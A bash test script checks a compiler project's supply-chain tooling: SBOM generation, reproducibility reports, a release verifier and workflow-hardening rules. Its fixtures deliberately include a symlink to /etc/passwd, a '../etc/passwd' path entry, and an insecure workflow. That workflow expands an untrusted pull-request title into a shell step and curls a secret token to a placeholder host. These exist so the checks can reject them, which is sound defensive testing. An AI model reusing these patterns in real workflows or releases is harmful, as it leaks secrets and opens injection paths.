#!/usr/bin/env bash
# Supply-chain scripts, tested end to end without network access:
#   scripts/sbom.py        deterministic CycloneDX and SPDX, and its check catches tampering
#   scripts/repro.sh       the reproducibility report agrees with build/stage2.c and stage3.c
#   scripts/verify-release.sh  accepts a correct release (rebuilding the archive here) and
#                          rejects every kind of tampering it is meant to catch
#   tests/supply/workflows.py  rejects unpinned actions, broad permissions, untrusted expansions
# Signatures and attestations need Sigstore and GitHub, so here they are only required to be
# present (a release without them must fail); the release workflow verifies them for real.
# Prints one line per check; exits 1 if any failed.
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
PY="python3 -I"
V="$ROOT/scripts/verify-release.sh"
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
pass=0; fail=0
ok()  { pass=$((pass+1)); printf '  pass  %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL  %s: %s\n' "$1" "$2"; }
sha256() { if command -v sha256sum >/dev/null; then sha256sum "$1"; else shasum -a 256 "$1"; fi | cut -d' ' -f1; }
# shellcheck disable=SC2094  # the glob never lists SHA256SUMS: it is skipped
sums() { (cd "$1" && for f in *; do [[ "$f" == SHA256SUMS || "$f" == *.sigstore.json ]] || echo "$(sha256 "$f")  $f"; done > SHA256SUMS); }

ver="$(sed -n 's/^const string VERSION = "\(.*\)";/\1/p' "$ROOT/compiler/main.cap")"
tag="v$ver"
commit="$(git -C "$ROOT" rev-parse HEAD 2>/dev/null || printf '0%.0s' {1..40})"
R="$tmp/release"; mkdir "$R"
A="$R/capstan-$ver.tar.gz"

# SBOM
$PY "$ROOT/tests/supply/make_archive.py" "$A" "$ver"
gen() { SOURCE_DATE_EPOCH=1700000000 $PY "$ROOT/scripts/sbom.py" generate --archive "$A" --commit "$commit" --cyclonedx "$1" --spdx "$2" >/dev/null; }
if gen "$R/capstan-$ver.cdx.json" "$R/capstan-$ver.spdx.json" && gen "$tmp/again.cdx.json" "$tmp/again.spdx.json" \
   && cmp -s "$R/capstan-$ver.cdx.json" "$tmp/again.cdx.json" && cmp -s "$R/capstan-$ver.spdx.json" "$tmp/again.spdx.json"; then
  ok "SBOM: CycloneDX and SPDX generated, byte-identical when regenerated"
else bad "SBOM generate" "failed or not deterministic"; fi
if out="$($PY "$ROOT/scripts/sbom.py" check --archive "$A" --cyclonedx "$R/capstan-$ver.cdx.json" --spdx "$R/capstan-$ver.spdx.json" 2>&1)"; then ok "SBOM check: $out"
else bad "SBOM check" "$out"; fi
if $PY - "$R/capstan-$ver.cdx.json" "$R/capstan-$ver.spdx.json" <<'PY'
import json, sys
c = json.load(open(sys.argv[1])); s = json.load(open(sys.argv[2]))
kinds = {p["value"] for comp in c["components"] if comp["type"] != "file" for p in comp["properties"]}
runtime = [comp["name"] for comp in c["components"] if comp.get("scope") == "required"]
assert kinds == {"build", "runtime"} and runtime == ["C standard library (with POSIX threads)"], (kinds, runtime)
assert {"aggregate": "complete", "dependencies": [c["metadata"]["component"]["bom-ref"]]} in c["compositions"]
rels = {(r["spdxElementId"], r["relationshipType"]) for r in s["relationships"]}
assert ("SPDXRef-Requirement-libc", "RUNTIME_DEPENDENCY_OF") in rels and ("SPDXRef-Requirement-c-compiler", "BUILD_TOOL_OF") in rels
assert c["metadata"]["timestamp"] == s["creationInfo"]["created"] == "2023-11-14T22:13:20Z"
PY
then ok "SBOM records the build tools, the C library as the only run-time dependency, and completeness"
else bad "SBOM content" "requirements or completeness missing"; fi
# Tampering with one file in the archive must be caught.
mkdir "$tmp/t" && (cd "$tmp/t" && tar -xzf "$A") && printf '\n' >> "$tmp/t/capstan-$ver/Makefile" \
  && (cd "$tmp/t" && tar -czf "$tmp/tampered.tar.gz" "capstan-$ver")
if ! $PY "$ROOT/scripts/sbom.py" check --archive "$tmp/tampered.tar.gz" --spdx "$R/capstan-$ver.spdx.json" >/dev/null 2>&1 \
   && ! $PY "$ROOT/scripts/sbom.py" check --archive "$tmp/tampered.tar.gz" --cyclonedx "$R/capstan-$ver.cdx.json" >/dev/null 2>&1; then
  ok "SBOM check rejects an archive with one changed file"
else bad "SBOM tamper" "a changed Makefile was not noticed"; fi
mkdir -p "$tmp/u/capstan-$ver" && cp -R "$tmp/t/capstan-$ver/." "$tmp/u/capstan-$ver/" && ln -s /etc/passwd "$tmp/u/capstan-$ver/link" \
  && (cd "$tmp/u" && tar -czf "$tmp/link.tar.gz" "capstan-$ver")
if ! $PY "$ROOT/scripts/sbom.py" generate --archive "$tmp/link.tar.gz" --commit "$commit" --spdx "$tmp/x.json" >/dev/null 2>&1; then
  ok "SBOM refuses an archive containing a symbolic link"
else bad "SBOM link" "accepted a symlink"; fi

# Reproducibility report
if out="$(CC="${CC:-cc}" "$ROOT/scripts/repro.sh" "$R/reproducibility-local.txt" 2>&1)" \
   && grep -qx "fixpoint: reached" "$R/reproducibility-local.txt" \
   && grep -qx "sha256 build/stage3.c: $(sha256 "$ROOT/build/stage3.c")" "$R/reproducibility-local.txt"; then
  ok "reproducibility report: fixpoint reached, stage3.c checksum recorded"
else bad "repro.sh" "$(tail -2 <<<"$out")"; fi
cp "$R/reproducibility-local.txt" "$R/reproducibility-other.txt"
echo "a test report" > "$R/test-report-local.txt"
sums "$R"

# The verifier, on a correct release: checksums, SBOM, reports, and a rebuild of the archive.
if out="$("$V" --skip-signatures --skip-attestations --rebuild "$tag" "$R" 2>&1)"; then ok "verify-release accepts the release and rebuilds the archive to the published checksums"
else bad "verify-release" "$(tail -3 <<<"$out")"; fi

# ...and on broken ones. Each case copies the release, breaks one thing, and must fail with the
# expected message.
expect_fail() {  # label, message, command to break $B
  local B="$tmp/case"; rm -rf "$B"; cp -R "$R" "$B"
  (cd "$B" && eval "$3")
  if out="$("$V" --skip-signatures --skip-attestations "$tag" "$B" 2>&1)"; then bad "$1" "accepted"
  elif grep -qF -- "$2" <<<"$out"; then ok "verify-release rejects $1"
  else bad "$1" "wrong failure: $(tail -1 <<<"$out")"; fi
}
expect_fail "a changed archive" "does not match its checksum" "printf x >> capstan-$ver.tar.gz"
expect_fail "a missing file" "missing" "rm test-report-local.txt"
expect_fail "an unlisted file" "not listed in SHA256SUMS" "echo extra > notes.txt"
expect_fail "a path in SHA256SUMS" "malformed" "echo '$(printf '0%.0s' {1..64})  ../etc/passwd' >> SHA256SUMS"
expect_fail "a release without an SBOM" "is not in the release" "rm capstan-$ver.spdx.json && grep -v spdx.json SHA256SUMS > s && mv s SHA256SUMS"
expect_fail "an SBOM that does not match the archive" "SBOM" "cp '$tmp/tampered.tar.gz' capstan-$ver.tar.gz && sums ."
expect_fail "a failed fixpoint" "did not reproduce itself" "sed -i.bak 's/^fixpoint: reached/fixpoint: FAILED/' reproducibility-other.txt && rm -f *.bak && sums ."
expect_fail "platforms that disagree" "another platform reported" "sed -i.bak 's/^\(sha256 build\/stage[23].c: \).*/\1$(printf 'a%.0s' {1..64})/' reproducibility-other.txt && rm -f *.bak && sums ."
expect_fail "a report for another version" "not Capstan $ver" "sed -i.bak 's/^compiler: .*/compiler: Capstan 9.9.9/' reproducibility-other.txt && rm -f *.bak && sums ."
# Without the skip flags, a release with no signatures must fail (whether or not cosign is installed).
if out="$("$V" --skip-attestations "$tag" "$R" 2>&1)"; then bad "unsigned release" "accepted"
elif grep -qE "has no signature bundle|cosign is needed" <<<"$out"; then ok "verify-release rejects an unsigned release"
else bad "unsigned release" "$(tail -1 <<<"$out")"; fi
if ! "$V" --skip-signatures --skip-attestations "0.4" "$R" >/dev/null 2>&1 && ! "$V" --repo 'x;y/z' "$tag" "$R" >/dev/null 2>&1; then ok "verify-release refuses malformed tags and repositories"
else bad "verify-release arguments" "accepted"; fi

# Workflow hardening rules, and that they catch what they should.
if out="$($PY "$ROOT/tests/supply/workflows.py" 2>&1)"; then ok "$out"; else bad "workflows" "$out"; fi
mkdir "$tmp/wf"
cat > "$tmp/wf/bad.yml" <<'YML'
on: pull_request_target
permissions:
  contents: write
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: someone/action@0123456789abcdef0123456789abcdef01234567
      - run: echo "${{ github.event.pull_request.title }}"
      - run: |
          curl -H "token: ${{ secrets.TOKEN }}" example.invalid
YML
out="$($PY "$ROOT/tests/supply/workflows.py" "$tmp/wf" 2>&1)"
n=0
for want in "pull_request_target" "exactly 'contents: read'" "not pinned" "persist-credentials" "no '# vX.Y.Z'" "untrusted data"; do
  grep -qF -- "$want" <<<"$out" && n=$((n+1))
done
if [[ $n == 6 && "$(grep -c 'untrusted data' <<<"$out")" == 2 ]]; then ok "workflow rules reject unpinned actions, write permissions, pull_request_target and untrusted expansions"
else bad "workflow rules" "caught $n of 6: $out"; fi

echo "supply chain: $pass passed, $fail failed"
[[ $fail -eq 0 ]]
